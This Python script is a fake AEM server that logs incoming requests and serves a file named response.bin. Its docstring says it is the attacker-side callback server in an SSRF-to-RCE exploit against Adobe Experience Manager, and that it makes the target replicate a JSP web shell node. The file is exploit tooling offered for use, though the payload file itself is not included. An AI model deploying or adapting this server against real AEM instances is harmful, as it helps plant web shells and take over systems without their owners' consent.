#!/usr/bin/env python3
"""
Fake AEM server used to receive inbound SSRF callbacks.

Listens on port 80 and serves the contents of response.bin to any GET request,
which triggers AEM to replicate a JSP shell node during an SSRF-to-RCE exploit.
All incoming requests (path, headers, body) are printed to stdout for inspection.

Usage:
    python3 aem_server.py
"""

from http.server import BaseHTTPRequestHandler, HTTPServer


class testHTTPServer_RequestHandler(BaseHTTPRequestHandler):
    """Simple HTTP request handler that logs all requests and serves response.bin for GET."""

    def do_print(self, method):
        """Print request method, path, headers, and body to stdout."""
        print("\n\n[+] {0} request: {1}".format(method, self.path))

        print("===[HEADERS]===")
        for name, value in sorted(self.headers.items()):
            print("\t{0}={1}".format(name, value))

        try:
            print(
                "===[BODY]===\n"
                + self.rfile.read(int(self.headers.get("content-length"))).decode(
                    "utf-8"
                )
            )
        except Exception:
            pass

    def do_POST(self):
        self.do_print("POST")

        self.send_response(200)
        self.end_headers()
        return

    def do_GET(self):
        self.do_print("GET")

        self.send_response(200)

        with open("response.bin", "rb") as f:
            data = f.read()

        self.send_header("Content-type", "application/octet-stream")
        self.send_header("Content-length", len(data))
        self.end_headers()

        self.wfile.write(data)
        return


def run():
    """Start the fake AEM HTTP server on port 80."""
    print("starting fake AEM server...")

    server_address = ("0.0.0.0", 80)
    httpd = HTTPServer(server_address, testHTTPServer_RequestHandler)
    print("running server...")
    httpd.serve_forever()


if __name__ == "__main__":
    run()
